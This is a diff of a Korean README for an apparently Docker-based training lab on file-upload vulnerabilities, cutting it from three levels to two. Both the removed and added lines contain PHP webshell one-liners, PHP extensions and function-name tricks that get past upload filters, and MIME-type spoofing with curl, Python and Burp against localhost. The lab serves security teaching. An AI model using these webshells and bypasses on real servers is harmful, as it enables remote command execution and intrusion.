@@ -45,7 +45,7 @@ Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.
 
 ## 🎓 실습 시나리오
 
-이 환경은 3단계 난이도로 구성되어 있으며, 각 레벨마다 다른 보안 검증이 적용됩니다.
+이 환경은 2단계 난이도로 구성되어 있으며, 각 레벨마다 다른 보안 검증이 적용됩니다.
 
 ### Level 1 - 초급 (필터링 없음)
 
@@ -67,68 +67,43 @@ Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.
    http://localhost:8080/uploads/webshell.php?cmd=whoami
    ```
 
-### Level 2 - 중급 (기본 필터링)
+### Level 2 - 중급 (확장자 + MIME 타입 검증)
 
 **적용된 보안 검증**:
-- ❌ `.php` 확장자 차단 (소문자만)
-- ❌ 위험 함수 키워드 차단: `system`, `exec`, `shell_exec`, `eval`, `passthru`
+- ❌ `.php` 확장자 차단
+- ❌ MIME 타입(Content-Type)에 `php` 문자열 포함 시 차단
+
+**취약점**:
+- ✅ `.php5`, `.phtml` 등 다른 PHP 확장자는 허용
+- ✅ MIME 타입은 클라이언트에서 조작 가능
 
 **우회 방법**:
 
-1. **확장자 우회 - .phtml 사용**
+1. **웹셸 파일 준비 (.phtml 확장자)**
    ```bash
    # 샘플 파일 사용
    cp www/bypass-samples/level2-phtml.phtml.txt shell.phtml
 
    # 또는 직접 작성
-   echo '<?php echo `{$_GET["cmd"]}`; ?>' > shell.phtml
+   echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
    ```
 
-2. **확장자 우회 - .php5 사용**
-   ```bash
-   cp www/bypass-samples/level2-php5.php5.txt shell.php5
-   ```
-
-3. **함수명 우회 - 대소문자 혼용**
-   ```php
-   <?php sYsTeM($_GET['cmd']); ?>
-   ```
-
-4. **함수명 우회 - 백틱 연산자**
-   ```php
-   <?php echo `{$_GET['cmd']}`; ?>
-   ```
-
-### Level 3 - 고급 (강화된 필터링)
-
-**적용된 보안 검증**:
-- ❌ 파일 크기 10KB 제한
-- ❌ `.php`, `.php3`, `.php4`, `.phar` 확장자 차단
-- ❌ MIME 타입 검증 (이미지/PDF/텍스트만)
-- ❌ `<?php` 태그 검증
-- ❌ 더 많은 위험 함수 차단 (대소문자 모두)
-
-**우회 방법**:
-
-1. **기본 우회 파일 준비**
-   ```bash
-   cp www/bypass-samples/level3-short-tag.phtml.txt shell.phtml
-   ```
-
-2. **MIME 타입 조작이 필요**
+2. **MIME 타입 조작하여 업로드**
 
    **방법 1: Burp Suite 사용**
-   - Burp Proxy 실행 및 브라우저 프록시 설정
-   - 파일 업로드 시 요청 가로채기
-   - `Content-Type: application/octet-stream`을
-     `Content-Type: image/png` 또는 `text/plain`으로 변경
+   - Burp Suite Proxy 실행
+   - 브라우저 프록시 설정 (127.0.0.1:8080)
+   - 웹사이트에서 Level 2 선택 후 파일 업로드
+   - Burp에서 요청 가로채기 (Intercept)
+   - `Content-Type: application/x-httpd-php` 또는 유사한 값을
+     `Content-Type: image/jpeg` 또는 `text/plain`으로 변경
    - Forward
 
-   **방법 2: curl 명령**
+   **방법 2: curl 명령 사용**
    ```bash
    curl -X POST \
-     -F "level=3" \
-     -F "file=@shell.phtml;type=image/png" \
+     -F "level=2" \
+     -F "file=@shell.phtml;type=image/jpeg" \
      http://localhost:8080/upload.php
    ```
 
@@ -137,9 +112,9 @@ Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.
    import requests
 
    files = {
-       'file': ('shell.phtml', open('shell.phtml', 'rb'), 'image/png')
+       'file': ('shell.phtml', open('shell.phtml', 'rb'), 'image/jpeg')
    }
-   data = {'level': '3'}
+   data = {'level': '2'}
 
    response = requests.post('http://localhost:8080/upload.php',
                            files=files, data=data)
@@ -149,6 +124,8 @@ Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.
 3. **업로드 성공 후 실행**
    ```
    http://localhost:8080/uploads/shell.phtml?cmd=ls
+   http://localhost:8080/uploads/shell.phtml?cmd=pwd
+   http://localhost:8080/uploads/shell.phtml?cmd=whoami
    ```
 
 ## 🔓 레벨별 취약점 및 우회 기법
@@ -156,6 +133,7 @@ Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.
 ### Level 1 - 초급
 **취약점**:
 - 모든 파일 확장자 허용
+- MIME 타입 검증 없음
 - 파일 내용 검증 없음
 - 어떤 PHP 파일도 업로드 및 실행 가능
 
@@ -165,96 +143,72 @@ Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.
 
 ### Level 2 - 중급
 **적용된 검증 (취약)**:
-1. `.php` 확장자만 차단 (소문자)
-2. `system`, `exec`, `shell_exec`, `eval`, `passthru` 키워드 차단
+1. `.php` 확장자 차단
+2. MIME 타입에 `php` 문자열 포함 시 차단
 
 **취약점**:
-- ✅ `.phtml`, `.php5`, `.php3` 등 다른 PHP 확장자 허용
-- ✅ 대소문자 구분으로 `sYsTeM` 등 우회 가능
-- ✅ 백틱(`) 연산자는 차단하지 않음
-- ✅ `pcntl_exec`, `proc_open` 등 다른 함수 미차단
+- ✅ `.phtml`, `.php5`, `.php3` 등 다른 PHP 확장자는 허용됨
+- ✅ MIME 타입은 클라이언트에서 쉽게 조작 가능
+- ✅ 파일 내용은 전혀 검증하지 않음
 
 **우회 기법**:
-1. 확장자 변경: `.php` → `.phtml`, `.php5`
-2. 대소문자 혼용: `system` → `sYsTeM`
-3. 백틱 사용: `` `whoami` ``
-4. 다른 함수 사용: `pcntl_exec()`, `proc_open()`
+1. **확장자 변경**: `.php` → `.phtml`, `.php5`
+2. **MIME 타입 조작**:
+   - Burp Suite: Content-Type 헤더를 `image/jpeg` 등으로 변경
+   - curl: `-F "file=@shell.phtml;type=image/jpeg"`
+   - Python requests: `files = {'file': ('shell.phtml', fp, 'image/jpeg')}`
 
-### Level 3 - 고급
-**적용된 검증 (취약)**:
-1. `.php`, `.php3`, `.php4`, `.phar` 확장자 차단
-2. MIME 타입 검증 (이미지/PDF/텍스트만)
-3. `<?php` 태그 검증
-4. 더 많은 위험 함수 차단 (대소문자 모두)
-5. 파일 크기 10KB 제한
+## 🛠️ 주요 우회 기법
 
-**취약점**:
-- ✅ `.phtml`, `.php5` 등은 여전히 허용
-- ✅ 짧은 PHP 태그 `<?` 는 미차단
-- ✅ MIME 타입은 클라이언트에서 조작 가능
-- ✅ 백틱 연산자 미차단
-- ✅ `pcntl_exec`, `assert` 등 일부 함수 미차단
-
-**우회 기법**:
-1. `.phtml` 또는 `.php5` 확장자 사용
-2. 짧은 PHP 태그 `<?` 사용
-3. MIME 타입 조작 (Burp Suite, curl, Python)
-4. 백틱 연산자로 명령 실행
-5. 파일 크기를 10KB 이하로 유지
-
-## 🛠️ 추가 우회 기법 모음
-
-### 1. 확장자 우회
+### 1. PHP 실행 가능한 확장자
 ```
-.phtml   - PHP HTML
-.php5    - PHP 5.x
-.php3    - PHP 3.x
-.php4    - PHP 4.x
-.inc     - Include 파일 (설정에 따라)
-.phps    - PHP Source (설정에 따라)
+.php     - 기본 PHP 확장자
+.phtml   - PHP HTML (많은 서버에서 실행)
+.php5    - PHP 5.x 확장자
+.php3    - PHP 3.x 확장자
+.php4    - PHP 4.x 확장자
 ```
 
-### 2. 함수 실행 우회
-```php
-// 백틱 연산자
-echo `whoami`;
+### 2. MIME 타입 조작 방법
 
-// 대소문자 혼용
-sYsTeM('ls');
+**Burp Suite 사용**:
+1. Proxy → Intercept 활성화
+2. 브라우저 프록시를 127.0.0.1:8080으로 설정
+3. 파일 업로드 시도
+4. Burp에서 `Content-Type:` 헤더 수정
+5. Forward
 
-// 문자열 연결
-$a = 'sys'; $b = 'tem';
-$func = $a.$b;
-$func('ls');
-
-// 변수 함수
-$f = 'system';
-$f('ls');
-
-// assert (PHP < 7.2)
-assert($_GET['cmd']);
-
-// create_function (PHP < 7.2)
-$f = create_function('', $_GET['cmd']);
-$f();
-```
-
-### 3. PHP 태그 우회
-```php
-<?php ... ?>   // 표준 태그
-<? ... ?>      // 짧은 태그
-<?= ... ?>     // 출력 태그 (짧은 태그)
-<% ... %>      // ASP 스타일 (asp_tags 설정 필요)
-```
-
-### 4. MIME 타입 조작
+**curl 사용**:
 ```bash
-# Burp Suite: Content-Type 변경
-# curl 사용
-curl -F "file=@shell.php;type=image/png"
+curl -X POST \
+  -F "level=2" \
+  -F "file=@shell.phtml;type=image/jpeg" \
+  http://localhost:8080/upload.php
+```
 
-# Python requests
-files = {'file': ('shell.php', open('shell.php', 'rb'), 'image/png')}
+**Python requests 사용**:
+```python
+import requests
+
+with open('shell.phtml', 'rb') as f:
+    files = {'file': ('shell.phtml', f, 'image/jpeg')}
+    data = {'level': '2'}
+    response = requests.post('http://localhost:8080/upload.php',
+                            files=files, data=data)
+    print(response.text)
+```
+
+### 3. 간단한 웹셸 예제
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+```php
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+```php
+<?php passthru($_GET['cmd']); ?>
 ```
 
 ## 🛡️ 보안 대책 (학습용)
